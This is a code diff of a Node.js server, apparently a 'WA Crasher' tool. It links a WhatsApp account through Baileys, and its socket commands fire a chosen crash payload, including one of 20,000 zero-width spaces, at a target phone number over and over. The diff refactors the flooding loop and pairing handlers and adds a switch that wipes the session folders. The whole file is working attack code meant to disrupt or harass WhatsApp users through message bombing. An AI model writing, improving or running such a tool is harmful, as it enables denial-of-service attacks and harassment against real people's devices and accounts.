@@ -2,16 +2,14 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
+const fs = require('fs');
 const cors = require('cors');
 
 const app = express();
 app.use(cors({ origin: '*' }));
 
 const server = http.createServer(app);
-const io = new Server(server, {
-    cors: { origin: '*', methods: ['GET', 'POST'] },
-    transports: ['websocket', 'polling']
-});
+const io = new Server(server, { cors: { origin: '*' } });
 
 let sock = null;
 let isReady = false;
@@ -23,52 +21,40 @@ const PAYLOADS = {
     3: '\u200B'.repeat(20000)
 };
 
+// Clean start
+if (process.env.CLEAN_START === 'true') {
+    try { fs.rmSync('auth', { recursive: true, force: true }); } catch(e) {}
+    try { fs.rmSync('baileys-session', { recursive: true, force: true }); } catch(e) {}
+    try { fs.rmSync('session', { recursive: true, force: true }); } catch(e) {}
+    console.log('Session cleaned');
+}
+
 async function connectWA() {
     try {
-        const { state, saveCreds } = await useMultiFileAuthState('session-wa');
+        const { state, saveCreds } = await useMultiFileAuthState('auth');
         
         sock = makeWASocket({
             auth: state,
-            browser: ['WA Crasher', 'Chrome', '1.0'],
-            printQRInTerminal: false
+            browser: ['WA Crasher', 'Chrome', '1.0']
         });
 
         sock.ev.on('connection.update', (update) => {
             const { connection, qr } = update;
-            
-            if (qr) {
-                console.log('QR received');
-                io.emit('qr', qr);
-            }
-            
-            if (connection === 'open') {
-                isReady = true;
-                io.emit('ready');
-                console.log('WhatsApp connected!');
-            }
-            
-            if (connection === 'close') {
-                isReady = false;
-                io.emit('disconnected');
-                console.log('Connection closed, retrying...');
-                setTimeout(connectWA, 5000);
-            }
+            if (qr) io.emit('qr', qr);
+            if (connection === 'open') { isReady = true; io.emit('ready'); }
+            if (connection === 'close') { isReady = false; io.emit('disconnected'); setTimeout(connectWA, 3000); }
         });
 
         sock.ev.on('creds.update', saveCreds);
-
-    } catch (e) {
-        console.error('Connect error:', e.message);
-        setTimeout(connectWA, 5000);
+    } catch(e) {
+        console.error(e);
+        setTimeout(connectWA, 3000);
     }
 }
 
 io.on('connection', (socket) => {
-    console.log('Client connected:', socket.id);
-
     socket.on('requestPairing', async (num) => {
         try {
-            if (!sock) return socket.emit('pairingError', 'WA belum siap');
             const code = await sock.requestPairingCode(num);
             socket.emit('pairingCode', code);
         } catch(e) {
@@ -77,41 +63,28 @@ io.on('connection', (socket) => {
     });
 
     socket.on('send', async (data) => {
-        if (!isReady || !sock) {
-            socket.emit('log', { type: 'err', msg: 'WA belum terhubung!' });
-            return;
-        }
-
-        const target = data.target.replace(/[^0-9]/g, '');
-        const jid = target + '@s.whatsapp.net';
+        if (!isReady) return socket.emit('log', { type: 'err', msg: 'WA belum terhubung!' });
+        const jid = data.target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         const payload = PAYLOADS[data.payloadIdx] || PAYLOADS[0];
-
-        socket.emit('log', { type: 'warn', msg: `Target: ${target} | ${data.count} pesan` });
-
+        
         for (let i = 0; i < data.count; i++) {
             try {
                 await sock.sendMessage(jid, { text: payload });
                 socket.emit('log', { type: 'ok', msg: `[${i+1}/${data.count}] Sent` });
             } catch(e) {
-                socket.emit('log', { type: 'err', msg: `Error: ${e.message}` });
-                break;
+                socket.emit('log', { type: 'err', msg: e.message }); break;
             }
             socket.emit('progress', { current: i+1, total: data.count });
             if (i < data.count - 1) await new Promise(r => setTimeout(r, 800));
         }
-
         socket.emit('done');
-        socket.emit('log', { type: 'ok', msg: 'Selesai!' });
     });
-
-    socket.on('disconnect', () => console.log('Client disconnected'));
 });
 
-// Health check
-app.get('/', (req, res) => res.send('WA Backend Running'));
+app.get('/', (req, res) => res.send('OK'));
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log('Server running on port ' + PORT);
+    console.log('Server on ' + PORT);
     connectWA();
 });
